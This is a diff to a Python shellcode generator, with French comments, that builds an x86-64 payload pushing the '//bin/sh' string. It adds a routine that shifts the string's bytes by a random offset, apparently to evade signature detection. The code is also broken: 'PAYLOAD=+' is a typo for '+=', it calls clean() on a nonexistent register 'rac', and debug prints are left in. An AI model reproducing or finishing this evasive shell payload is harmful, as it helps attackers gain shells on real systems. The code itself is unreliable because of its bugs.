@@ -25,6 +25,7 @@ def factorOffus(string4Payload):
     global PAYLOAD
     arr = []
     ope = r(1,2)
+    print("OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO",ope)
    
     for i in range(0,18,2):
         if i == 0 :
@@ -55,19 +56,22 @@ def factorOffus(string4Payload):
     arr[:] = list(set(arr)) #Rend unique chaque valeurs
     rand = r(arr[0],arr[-1])
     #print ("Random = ", rand, type(rand) )
-
+    if ope == 1 :
+         rand = rand * -1
+    print(rand)
     return rand
 
 def offus(string4Payload, rand):
     newString = "0x"
 
-    for i in range(0,16,2):
+    for i in range(2,18,2):
         if i == 0 :
                 continue
         
         sub = string4Payload[i] + string4Payload[i+1]
-        numInHex = int(sub,16) + rand
-        newString = newString + str(numInHex)
+        numInDec = int(sub,16) + rand
+        numInHex = hex(numInDec)
+        newString = newString + str(numInHex[-2:])
     
     return newString
 
@@ -150,9 +154,20 @@ def shell():
     global PAYLOAD
     PAYLOAD+=clean("rax")
     PAYLOAD+=clean("rdx")
-    factorOffus = factorOffus()
-    offus("0x68732f6e69622f2f", factorOffus)
+    PAYLOAD+=clean("rac")
 
+    factorOffusVar = factorOffus("0x68732f6e69622f2f")
+    offuString = offus("0x68732f6e69622f2f",factorOffusVar)
+    offuString = offuString[::-1]#Inverse en mirroir tout la chaine pour op code
+
+    PAYLOAD=+"48bb"
+    for i in range(0,15,2):
+        sub = offuString[i+1] + offuString[i] 
+        PAYLOAD+= sub
+        
+    
+    
+        
     
 def _exit():
     global PAYLOAD
